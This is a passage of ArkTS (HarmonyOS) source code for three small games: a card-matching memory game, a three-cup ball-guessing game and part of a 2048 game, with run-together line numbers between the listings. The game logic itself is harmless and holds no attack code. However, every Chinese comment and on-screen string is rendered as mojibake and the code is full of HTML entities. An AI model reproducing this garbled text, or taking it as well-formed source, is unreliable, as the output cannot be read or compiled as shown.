è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦ &#125;); &#125; // é‡ç½®å¡ç‰‡çŠ¶æ€çš„æ–¹æ³• reset() &#123; this.isVisible = false; // è®¾ç½®å¡ç‰‡ä¸ºä¸å¯è§ this.rotationAngle = 180; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦ this.isFrontVisible = false; // è®¾ç½®å¡ç‰‡ä¸ºèƒŒé¢æœä¸Š this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ this.isMatched = false; // è®¾ç½®å¡ç‰‡ä¸ºæœªåŒ¹é… &#125; // éšè—å¡ç‰‡æ­£é¢çš„æ–¹æ³• hideFace(animationTime: number, callback?: () =&gt; void) &#123; if (this.isAnimationRunning) &#123; // å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å› return; &#125; this.isAnimationRunning = true; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­ animateToImmediately(&#123; // å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ animateToImmediately(&#123; // å†æ¬¡å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ this.isFrontVisible = false; // è®¾ç½®å¡ç‰‡ä¸ºèƒŒé¢æœä¸Š this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.isVisible = false; // è®¾ç½®å¡ç‰‡ä¸ºä¸å¯è§ this.rotationAngle = 180; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦ &#125;); &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.isVisible = true; // è®¾ç½®å¡ç‰‡ä¸ºå¯è§ this.rotationAngle = 90; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦ &#125;); &#125;&#125;// å®šä¹‰ç»„ä»¶å…¥å£@Entry@Componentstruct MemoryGame &#123; // å®šä¹‰æ¸¸æˆç»„ä»¶ @State gameCells: GameCell[] = []; // å­˜å‚¨æ¸¸æˆä¸­çš„æ‰€æœ‰å•å…ƒæ ¼ @State cellSize: number = 150; // å•å…ƒæ ¼çš„å¤§å° @State cellSpacing: number = 5; // å•å…ƒæ ¼ä¹‹é—´çš„é—´è· @State transitionDuration: number = 150; // è¿‡æ¸¡åŠ¨ç”»çš„æŒç»­æ—¶é—´ @State firstSelectedIndex: number | null = null; // è®°å½•ç¬¬ä¸€æ¬¡é€‰æ‹©çš„å¡ç‰‡ç´¢å¼• @State secondSelectedIndex: number | null = null; // è®°å½•ç¬¬äºŒæ¬¡é€‰æ‹©çš„å¡ç‰‡ç´¢å¼• @State isGameOver: boolean = false; // æ¸¸æˆæ˜¯å¦ç»“æŸ @State startTime: number = 0; // æ¸¸æˆå¼€å§‹æ—¶é—´ aboutToAppear(): void &#123; // ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶è§¦å‘ let cardValues: string[] = [&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;, &quot;F&quot;, &quot;G&quot;, &quot;H&quot;]; // å®šä¹‰å¡ç‰‡çš„å€¼ for (let value of cardValues) &#123; // éå†å¡ç‰‡å€¼ this.gameCells.push(new GameCell(value)); // æ·»åŠ åˆ°æ¸¸æˆå•å…ƒæ ¼æ•°ç»„ä¸­ this.gameCells.push(new GameCell(value)); // æ¯ä¸ªå€¼æ·»åŠ ä¸¤æ¬¡ä»¥å½¢æˆå¯¹ &#125; this.shuffleCards(); // æ´—ç‰Œ &#125; // æ´—ç‰Œæ–¹æ³• shuffleCards() &#123; this.firstSelectedIndex = null; // æ¸…é™¤ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼• this.secondSelectedIndex = null; // æ¸…é™¤ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼• this.isGameOver = false; // æ¸¸æˆæœªç»“æŸ this.startTime = Date.now(); // è®¾ç½®æ¸¸æˆå¼€å§‹æ—¶é—´ä¸ºå½“å‰æ—¶é—´ for (let i = 0; i &lt; 16; i++) &#123; // é‡ç½®æ‰€æœ‰å•å…ƒæ ¼çŠ¶æ€ this.gameCells[i].reset(); &#125; for (let i = this.gameCells.length - 1; i &gt; 0; i--) &#123; // æ´—ç‰Œç®—æ³• const randomIndex = Math.floor(Math.random() * (i + 1)); // éšæœºç´¢å¼• let tempValue = this.gameCells[i].value; // ä¸´æ—¶ä¿å­˜å€¼ this.gameCells[i].value = this.gameCells[randomIndex].value; // äº¤æ¢å€¼ this.gameCells[randomIndex].value = tempValue; // äº¤æ¢å€¼ &#125; &#125; // æ£€æŸ¥å¡ç‰‡æ˜¯å¦åŒ¹é…çš„æ–¹æ³• checkForMatch() &#123; if (this.firstSelectedIndex !== null &amp;&amp; this.secondSelectedIndex !== null) &#123; // ç¡®ä¿ä¸¤ä¸ªç´¢å¼•éƒ½ä¸ä¸ºç©º const firstCell = this.gameCells[this.firstSelectedIndex]; // è·å–ç¬¬ä¸€ä¸ªé€‰ä¸­çš„å•å…ƒæ ¼ const secondCell = this.gameCells[this.secondSelectedIndex]; // è·å–ç¬¬äºŒä¸ªé€‰ä¸­çš„å•å…ƒæ ¼ if (firstCell.value === secondCell.value) &#123; // å¦‚æœä¸¤ä¸ªå•å…ƒæ ¼çš„å€¼ç›¸åŒ firstCell.isMatched = true; // æ ‡è®°ä¸ºå·²åŒ¹é… secondCell.isMatched = true; // æ ‡è®°ä¸ºå·²åŒ¹é… this.firstSelectedIndex = null; // æ¸…é™¤ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼• this.secondSelectedIndex = null; // æ¸…é™¤ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼• if (this.gameCells.every(cell =&gt; cell.isMatched)) &#123; // å¦‚æœæ‰€æœ‰å•å…ƒæ ¼éƒ½å·²åŒ¹é… this.isGameOver = true; // æ¸¸æˆç»“æŸ console.info(&quot;æ¸¸æˆç»“æŸ&quot;); // æ‰“å°ä¿¡æ¯ promptAction.showDialog(&#123; // æ˜¾ç¤ºå¯¹è¯æ¡† title: &#x27;æ¸¸æˆèƒœåˆ©ï¼&#x27;, // å¯¹è¯æ¡†æ ‡é¢˜ message: &#x27;æ­å–œä½ ï¼Œç”¨æ—¶ï¼š&#x27; + ((Date.now() - this.startTime) / 1000).toFixed(3) + &#x27;ç§’&#x27;, // å¯¹è¯æ¡†æ¶ˆæ¯ buttons: [&#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, color: &#x27;#ffa500&#x27; &#125;] // å¯¹è¯æ¡†æŒ‰é’® &#125;).then(() =&gt; &#123; // å¯¹è¯æ¡†å…³é—­åæ‰§è¡Œ this.shuffleCards(); // é‡æ–°å¼€å§‹æ¸¸æˆ &#125;); &#125; &#125; else &#123; // å¦‚æœä¸¤ä¸ªå•å…ƒæ ¼çš„å€¼ä¸åŒ setTimeout(() =&gt; &#123; // å»¶è¿Ÿä¸€æ®µæ—¶é—´å if (this.firstSelectedIndex !== null) &#123; // å¦‚æœç¬¬ä¸€ä¸ªç´¢å¼•ä¸ä¸ºç©º this.gameCells[this.firstSelectedIndex].hideFace(this.transitionDuration, () =&gt; &#123; // éšè—å¡ç‰‡ this.firstSelectedIndex = null; // æ¸…é™¤ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼• &#125;); &#125; if (this.secondSelectedIndex !== null) &#123; // å¦‚æœç¬¬äºŒä¸ªç´¢å¼•ä¸ä¸ºç©º this.gameCells[this.secondSelectedIndex].hideFace(this.transitionDuration, () =&gt; &#123; // éšè—å¡ç‰‡ this.secondSelectedIndex = null; // æ¸…é™¤ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼• &#125;); &#125; &#125;, 400); // å»¶è¿Ÿæ—¶é—´ &#125; &#125; &#125; // æ„å»ºæ¸¸æˆç•Œé¢çš„æ–¹æ³• build() &#123; Column(&#123; space: 20 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€ Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // åˆ›å»ºä¸€ä¸ªå¯æ¢è¡Œçš„å¼¹æ€§å¸ƒå±€ ForEach(this.gameCells, (gameCell: GameCell, index: number) =&gt; &#123; // éå†æ¸¸æˆå•å…ƒæ ¼ Text(`$&#123;gameCell.isVisible ? gameCell.value : &#x27;&#x27;&#125;`) // æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸² .width(`$&#123;this.cellSize&#125;lpx`) // è®¾ç½®å®½åº¦ .height(`$&#123;this.cellSize&#125;lpx`) // è®¾ç½®é«˜åº¦ .margin(`$&#123;this.cellSpacing&#125;lpx`) // è®¾ç½®è¾¹è· .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) // è®¾ç½®å­—ä½“å¤§å° .textAlign(TextAlign.Center) // æ–‡æœ¬å±…ä¸­ .backgroundColor(gameCell.isVisible ? Color.Orange : Color.Gray) // è®¾ç½®èƒŒæ™¯é¢œè‰² .fontColor(Color.White) // è®¾ç½®å­—ä½“é¢œè‰² .borderRadius(5) // è®¾ç½®åœ†è§’ .rotate(&#123; // è®¾ç½®æ—‹è½¬ x: 0, y: 1, z: 0, angle: gameCell.rotationAngle, // æ—‹è½¬è§’åº¦ centerX: `$&#123;this.cellSize / 2&#125;lpx`, // ä¸­å¿ƒç‚¹Xåæ ‡ centerY: `$&#123;this.cellSize / 2&#125;lpx`, // ä¸­å¿ƒç‚¹Yåæ ‡ &#125;) .onClick(() =&gt; &#123; // å•å‡»äº‹ä»¶å¤„ç† if (this.isGameOver) &#123; // å¦‚æœæ¸¸æˆå·²ç»“æŸ console.info(&quot;æ¸¸æˆå·²ç»“æŸ&quot;); // æ‰“å°ä¿¡æ¯ return; &#125; if (gameCell.isMatched) &#123; // å¦‚æœå•å…ƒæ ¼å·²åŒ¹é… console.info(&quot;å½“å‰å·²æ ‡è®°&quot;); // æ‰“å°ä¿¡æ¯ return; &#125; if (this.firstSelectedIndex == null) &#123; // å¦‚æœæ²¡æœ‰ç¬¬ä¸€æ¬¡é€‰æ‹© this.firstSelectedIndex = index; // è®¾ç½®ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼• if (!gameCell.isFrontVisible) &#123; // å¦‚æœä¸æ˜¯æ­£é¢æœä¸Š gameCell.revealFace(this.transitionDuration); // å±•ç¤ºæ­£é¢ &#125; &#125; else if (this.firstSelectedIndex == index) &#123; // å¦‚æœä¸ç¬¬ä¸€æ¬¡é€‰æ‹©ç›¸åŒ console.info(&quot;å’Œä¸Šä¸€æ¬¡ç‚¹å‡»çš„æ˜¯ä¸€æ ·çš„ï¼Œä¸äºˆå¤„ç†&quot;); // æ‰“å°ä¿¡æ¯ &#125; else if (this.secondSelectedIndex == null) &#123; // å¦‚æœæ²¡æœ‰ç¬¬äºŒæ¬¡é€‰æ‹© this.secondSelectedIndex = index; // è®¾ç½®ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼• if (!gameCell.isFrontVisible) &#123; // å¦‚æœä¸æ˜¯æ­£é¢æœä¸Š gameCell.revealFace(this.transitionDuration, () =&gt; &#123; // å±•ç¤ºæ­£é¢ this.checkForMatch(); // æ£€æŸ¥æ˜¯å¦åŒ¹é… &#125;); &#125; &#125; &#125;); &#125;); &#125;.width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 4&#125;lpx`); // è®¾ç½®å®½åº¦ Button(&#x27;é‡æ–°å¼€å§‹&#x27;) // åˆ›å»ºâ€œé‡æ–°å¼€å§‹â€æŒ‰é’® .onClick(() =&gt; &#123; // æŒ‰é’®ç‚¹å‡»äº‹ä»¶ this.shuffleCards(); // é‡æ–°å¼€å§‹æ¸¸æˆ &#125;); &#125;.height(&#x27;100%&#x27;).width(&#x27;100%&#x27;); // è®¾ç½®é«˜åº¦å’Œå®½åº¦ &#125;&#125; 3cup ballä¸‰æ¯çŒœçƒ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182// ä½¿ç”¨è£…é¥°å™¨æ¥è¿½è¸ªå¯¹è±¡çš„å˜åŒ–@ObservedV2class Cup &#123; // ä½¿ç”¨è£…é¥°å™¨æ¥è¿½è¸ªå±æ€§çš„å˜åŒ– @Trace positionX: number; // æ¯å­çš„Xè½´ä½ç½® @Trace positionY: number; // æ¯å­çš„Yè½´ä½ç½® @Trace containsBall: boolean; // æ¯å­å†…æ˜¯å¦æœ‰çƒ @Trace isRevealed: boolean; // æ¯å­æ˜¯å¦æ‰“å¼€ // æ„é€ å‡½æ•°åˆå§‹åŒ–æ¯å­çš„çŠ¶æ€ constructor(hasBall: boolean) &#123; this.positionX = 0; this.positionY = 0; this.containsBall = hasBall; this.isRevealed = true; &#125;&#125; // æ¸¸æˆå…¥å£ç»„ä»¶@Entry@Componentstruct ThreeCupGame &#123; // æ¸¸æˆçŠ¶æ€å˜é‡ @State gameCups: Cup[] = [// åˆå§‹åŒ–ä¸‰ä¸ªæ¯å­ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰çƒ new Cup(true), new Cup(false), new Cup(false) ]; @State cupWidth: number = 200; // æ¯å­å®½åº¦ @State cupSpacing: number = 10; // æ¯å­ä¹‹é—´çš„é—´è· @State animationDurationMs: number = 140; // åŠ¨ç”»æŒç»­æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ @State isGameAnimating: boolean = false; // æ˜¯å¦æ­£åœ¨åŠ¨ç”»ä¸­ @State mixingCount: number = 5; // æ¯å±€æ¸¸æˆæ··åˆæ¬¡æ•° @State currentMixingCount: number = 0; // å½“å‰æ­£åœ¨è¿›è¡Œçš„æ··åˆæ¬¡æ•°è®¡æ•° // å¼€å§‹æ¸¸æˆçš„æ–¹æ³• startGame() &#123; this.currentMixingCount--; // å‡å°‘æ··åˆæ¬¡æ•° const cupPairs = [[0, 1], [0, 2], [1, 2]]; // å¯èƒ½çš„æ¯å­å¯¹ç»„åˆ const selectedPair = cupPairs[Math.floor(Math.random() * cupPairs.length)]; // éšæœºé€‰æ‹©ä¸€å¯¹ this.moveCups(selectedPair[0], selectedPair[1]); // å¼€å§‹ç§»åŠ¨é€‰å®šçš„ä¸¤ä¸ªæ¯å­ &#125; // ç§»åŠ¨æŒ‡å®šçš„ä¸¤ä¸ªæ¯å­ moveCups(cupIndex1: number, cupIndex2: number) &#123; const direction: number = Math.random() &lt; 0.5 ? -1 : 1; // éšæœºæ–¹å‘ const distanceFactor: number = Math.abs(cupIndex1 - cupIndex2); // è·ç¦»å› å­ const adjustedDistanceFactor: number = distanceFactor === 1 ? 2 : 1; // æ ¹æ®è·ç¦»è°ƒæ•´å› å­ animateToImmediately(&#123; delay: 0, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex1].positionY = -direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex1].positionX = (this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex1].positionY = -direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs * 2, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex1].positionX = (this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex1].positionY = 0 &#125;) animateToImmediately(&#123; delay: 0, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex2].positionY = direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex2].positionX = -(this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex2].positionY = direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs * 2, duration: this.animationDurationMs, onFinish: () =&gt; &#123; this.swapBalls(cupIndex1, cupIndex2) &#125; &#125;, () =&gt; &#123; this.gameCups[cupIndex2].positionX = -(this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex2].positionY = 0 &#125;) &#125; // é‡ç½®æ¯å­çš„ä½ç½® resetCupPosition(cupIndex: number) &#123; this.gameCups[cupIndex].positionX = 0; this.gameCups[cupIndex].positionY = 0; &#125; // äº¤æ¢ä¸¤ä¸ªæ¯å­å†…çš„çƒ swapBalls(cupIndex1: number, cupIndex2: number) &#123; this.resetCupPosition(cupIndex1); this.resetCupPosition(cupIndex2); let temporaryBallStatus = this.gameCups[cupIndex1].containsBall; this.gameCups[cupIndex1].containsBall = this.gameCups[cupIndex2].containsBall; this.gameCups[cupIndex2].containsBall = temporaryBallStatus; if (this.currentMixingCount &lt;= 0) &#123; this.isGameAnimating = false; &#125; else &#123; setTimeout(() =&gt; &#123; this.startGame(); &#125;, 10); &#125; &#125; // æ„å»ºæ¸¸æˆç•Œé¢ build() &#123; Column(&#123; space: 20 &#125;) &#123; // æ¸¸æˆæ ‡é¢˜ Text(&#x27;çŒœå°çƒæ¸¸æˆ&#x27;) .fontSize(24) .margin(&#123; top: 20 &#125;); // åŠ¨ç”»é€Ÿåº¦æ§åˆ¶å™¨ Counter() &#123; Text(`å½“å‰é€Ÿåº¦$&#123;this.animationDurationMs&#125;æ¯«ç§’`) .fontColor(Color.Black) .fontSize(&#x27;26lpx&#x27;); &#125;.width(&#x27;400lpx&#x27;).onInc(() =&gt; &#123; this.animationDurationMs += 10; &#125;).onDec(() =&gt; &#123; this.animationDurationMs -= 10; this.animationDurationMs = this.animationDurationMs &lt; 10 ? 10 : this.animationDurationMs; &#125;); // æ··åˆæ¬¡æ•°æ§åˆ¶å™¨ Counter() &#123; Text(`æ¯å±€æ··åˆ$&#123;this.mixingCount&#125;æ¬¡`) .fontColor(Color.Black) .fontSize(&#x27;26lpx&#x27;); &#125;.width(&#x27;400lpx&#x27;).onInc(() =&gt; &#123; this.mixingCount += 1; &#125;).onDec(() =&gt; &#123; this.mixingCount -= 1; this.mixingCount = this.mixingCount &lt; 1 ? 1 : this.mixingCount &#125;); // æ¯å­å¸ƒå±€ Row() &#123; ForEach(this.gameCups, (cup: Cup) =&gt; &#123; Text(cup.isRevealed ? (cup.containsBall ? &#x27;å°çƒ&#x27; : &#x27;ç©º&#x27;) : &#x27;&#x27;) .width(`$&#123;this.cupWidth&#125;lpx`) .height(`$&#123;this.cupWidth&#125;lpx`) .margin(`$&#123;this.cupSpacing&#125;lpx`) .backgroundColor(Color.Orange) .fontSize(`$&#123;this.cupWidth / 4&#125;lpx`) .textAlign(TextAlign.Center) .fontColor(Color.White) .borderRadius(5) .translate(&#123; x: `$&#123;cup.positionX&#125;lpx`, y: `$&#123;cup.positionY&#125;lpx` &#125;) .onClick(() =&gt; &#123; if (!this.isGameAnimating) &#123; cup.isRevealed = true; &#125; &#125;); &#125;); &#125;.justifyContent(FlexAlign.Center).width(&#x27;100%&#x27;).height(&#x27;720lpx&#x27;).backgroundColor(Color.Gray); // å¼€å§‹æ¸¸æˆæŒ‰é’® Button(&#x27;å¼€å§‹æ¸¸æˆ&#x27;).onClick(() =&gt; &#123; if (!this.isGameAnimating) &#123; this.currentMixingCount = this.mixingCount; this.isGameAnimating = true; this.gameCups.forEach(cup =&gt; cup.isRevealed = false); this.startGame(); &#125; &#125;); &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;); &#125;&#125; 2048123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302// ä½¿ç”¨è£…é¥°å™¨æ ‡è®°Cellç±»ï¼Œå¯èƒ½è¡¨ç¤ºè¯¥ç±»å…·æœ‰å¯è§‚æµ‹æ€§@ObservedV2class Cell &#123; // ä½¿ç”¨Traceè£…é¥°å™¨æ ‡è®°valueå±æ€§ï¼Œå¯èƒ½è¡¨ç¤ºè¯¥å±æ€§çš„å˜åŒ–ä¼šè¢«è¿½è¸ª @Trace value: number; // æ„é€ å‡½æ•°åˆå§‹åŒ–å•å…ƒæ ¼çš„å€¼ä¸º0 constructor() &#123; this.value = 0; &#125;&#125; // ä½¿ç”¨Entryå’ŒComponentè£…é¥°å™¨æ ‡è®°Game2048ç»“æ„ä½“ï¼Œå¯èƒ½è¡¨ç¤ºè¿™æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ï¼Œå¹¶ä¸”è¯¥ç»“æ„ä½“å®šä¹‰äº†ä¸€ä¸ªç»„ä»¶@Entry@Component // å®šä¹‰Game2048ç»“æ„ä½“struct Game2048 &#123; // ä½¿ç”¨Stateè£…é¥°å™¨æ ‡è®°çŠ¶æ€å˜é‡ï¼Œå¯èƒ½è¡¨ç¤ºè¿™äº›å˜é‡æ˜¯ç»„ä»¶çš„çŠ¶æ€ @State board: Cell[][] = []; // æ¸¸æˆç›˜é¢ @State score: number = 0; // åˆ†æ•° @State cellSize: number = 200; // å•å…ƒæ ¼å¤§å° @State cellMargin: number = 5; // å•å…ƒæ ¼ä¹‹é—´çš„è¾¹è· @State screenStartX: number = 0; // è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Xåæ ‡ @State screenStartY: number = 0; // è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Yåæ ‡ @State lastScreenX: number = 0; // è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Xåæ ‡ @State lastScreenY: number = 0; // è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Yåæ ‡ // å®šä¹‰é¢œè‰²æ•°ç»„ colors: string[] = [ &#x27;#CCCCCC&#x27;, // 0 - ç°è‰² &#x27;#FFC107&#x27;, // 2 - é»„è‰² &#x27;#FF9800&#x27;, // 4 - æ©™è‰² &#x27;#FF5722&#x27;, // 8 - æ·±æ©™è‰² &#x27;#F44336&#x27;, // 16 - çº¢è‰² &#x27;#9C27B0&#x27;, // 32 - ç´«è‰² &#x27;#3F51B5&#x27;, // 64 - è“ç´«è‰² &#x27;#00BCD4&#x27;, // 128 - è“è‰² &#x27;#009688&#x27;, // 256 - æ·±é’è‰² &#x27;#4CAF50&#x27;, // 512 - ç»¿è‰² &#x27;#8BC34A&#x27;, // 1024 - æµ…ç»¿è‰² &#x27;#CDDC39&#x27;, // 2048 - æŸ æª¬é»„ &#x27;#FFEB3B&#x27;, // 4096 - æ·¡é»„è‰² &#x27;#795548&#x27;, // 8192 - æ£•è‰² &#x27;#607D8B&#x27;, // 16384 - æ·±ç°è‰² &#x27;#9E9E9E&#x27;, // 32768 - ç°è‰² &#x27;#000000&#x27; // ä»¥ä¸Š - é»‘è‰² ]; // æ¸¸æˆå³å°†å‡ºç°æ—¶æ‰§è¡Œçš„æ–¹æ³• aboutToAppear() &#123; this.score = 0; // é‡ç½®åˆ†æ•° this.initBoard(); // é‡æ–°åˆå§‹åŒ–æ¸¸æˆæ¿ this.addRandomTiles(2); // æ·»åŠ ä¸¤ä¸ªéšæœºæ–¹å— &#125; // åˆå§‹åŒ–æ¸¸æˆç›˜é¢ initBoard() &#123; if (this.board.length == 0) &#123; for (let i = 0; i &lt; 4; i++) &#123; let cellArr: Cell[] = []; for (let j = 0; j &lt; 4; j++) &#123; cellArr.push(new Cell()); // åˆ›å»ºæ–°å•å…ƒæ ¼ &#125; this.board.push(cellArr); // æ·»åŠ åˆ°ç›˜é¢ &#125; &#125; else &#123; for (let i = 0; i &lt; this.board.length; i++) &#123; for (let j = 0; j &lt; this.board[i].length; j++) &#123; this.board[i][j].value = 0; // æ¸…ç©ºå•å…ƒæ ¼ &#125; &#125; &#125; &#125; // åœ¨ç›˜é¢ä¸Šæ·»åŠ æŒ‡å®šæ•°é‡çš„éšæœºæ–¹å— addRandomTiles(count: number) &#123; let emptyCells: object[] = []; for (let row = 0; row &lt; 4; row++) &#123; for (let col = 0; col &lt; 4; col++) &#123; if (this.board[row][col].value === 0) &#123; emptyCells.push(Object(&#123; row: row, col: col &#125;)); // è®°å½•ç©ºå•å…ƒæ ¼ä½ç½® &#125; &#125; &#125; for (let i = 0; i &lt; count; i++) &#123; if (emptyCells.length &gt; 0) &#123; let randomIndex = Math.floor(Math.random() * emptyCells.length); let obj = emptyCells[randomIndex]; this.board[obj[&#x27;row&#x27;]][obj[&#x27;col&#x27;]].value = Math.random() &lt; 0.9 ? 2 : 4; // éšæœºç”Ÿæˆ2æˆ–4 emptyCells.splice(randomIndex, 1); // ç§»é™¤å·²ä½¿ç”¨çš„ç©ºå•å…ƒæ ¼ä½ç½® &#125; &#125; &#125; // å‘å·¦æ»‘åŠ¨ slideLeft() &#123; for (let row = 0; row &lt; 4; row++) &#123; let tempRow: number[] = []; // ä¸´æ—¶å­˜å‚¨è¡Œæ•°æ® let merged: boolean[] = new Array(4).fill(false); // æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡ for (let col = 0; col &lt; 4; col++) &#123; if (this.board[row][col].value !== 0) &#123; tempRow.push(this.board[row][col].value); // ç§»åŠ¨éé›¶å€¼ &#125; &#125; let mergePos = 0; while (mergePos &lt; tempRow.length - 1) &#123; if (tempRow[mergePos] === tempRow[mergePos + 1] &amp;&amp; !merged[mergePos]) &#123; tempRow[mergePos] *= 2; // åˆå¹¶ this.score += tempRow[mergePos]; // æ›´æ–°åˆ†æ•° merged[mergePos] = true; // æ ‡è®°å·²åˆå¹¶ tempRow.splice(mergePos + 1, 1); // ç§»é™¤åˆå¹¶è¿‡çš„å€¼ &#125; else &#123; mergePos++; &#125; &#125; while (tempRow.length &lt; 4) &#123; tempRow.push(0); // å¡«å……ç©ºä½ &#125; for (let col = 0; col &lt; 4; col++) &#123; this.board[row][col].value = tempRow[col]; // æ›´æ–°ç›˜é¢ &#125; &#125; &#125; // å‘å³æ»‘åŠ¨ slideRight() &#123; for (let row = 0; row &lt; 4; row++) &#123; let tempRow: number[] = []; // ä¸´æ—¶å­˜å‚¨è¡Œæ•°æ® let merged: boolean[] = new Array(4).fill(false); // æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡ for (let col = 3; col &gt;= 0; col--) &#123; if (this.board[row][col].value !== 0) &#123; tempRow.unshift(this.board[row][col].value); // ç§»åŠ¨éé›¶å€¼ &#125; &#125; let mergePos = tempRow.length - 1; while (mergePos &gt; 0) &#123; if (tempRow[mergePos] === tempRow[mergePos - 1] &amp;&amp; !merged[mergePos - 1]) &#123; tempRow[mergePos] *= 2; // åˆå¹¶ this.score += tempRow[mergePos]; // æ›´æ–°åˆ†æ•° merged[mergePos - 1] = true; // æ ‡è®°å·²åˆå¹¶ tempRow.splice(mergePos - 1, 1); // ç§»é™¤åˆå¹¶è¿‡çš„å€¼ &#125; else &#123; mergePos--; &#125; &#125; while (tempRow.length &lt; 4) &#123; tempRow.unshift(0); // å¡«å……ç©ºä½ &#125; for (let col = 0; col &lt; 4; col++) &#123; this.board[row][col].value = tempRow[col]; // æ›´æ–°ç›˜é¢ &#125; &#125; &#125; // å‘ä¸Šæ»‘åŠ¨ slideUp() &#123; for (let col = 0; col &lt; 4; col++) &#123; let tempCol: number[] = []; // ä¸´æ—¶å­˜å‚¨åˆ—æ•°æ® let merged: boolean[] = new Array(4).fill(false); // æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡ for (let row = 0; row &lt; 4; row++) &#123; if (this.board[row][col].value !== 0) &#123; tempCol.push(this.board[row][col].value); // ç§»åŠ¨éé›¶å€¼ &#125; &#125; let mergePos = 0; while (mergePos &lt; tempCol.length - 1) &#123; if (tempCol[mergePos] === tempCol[mergePos + 1] &amp;&amp; !merged[mergePos]) &#123; tempCol[mergePos] *= 2; // åˆå¹¶ this.score += tempCol[mergePos]; // æ›´æ–°åˆ†æ•° merged[mergePos] = true; // æ ‡è®°å·²åˆå¹¶ tempCol.splice(mergePos + 1, 1); // ç§»é™¤åˆå¹¶è¿‡çš„å€¼ &#125; else &#123; mergePos++; &#125; &#125; while (tempCol.length &lt; 4) &#123; tempCol.push(0); // å¡«å……ç©ºä½ &#125; for (let 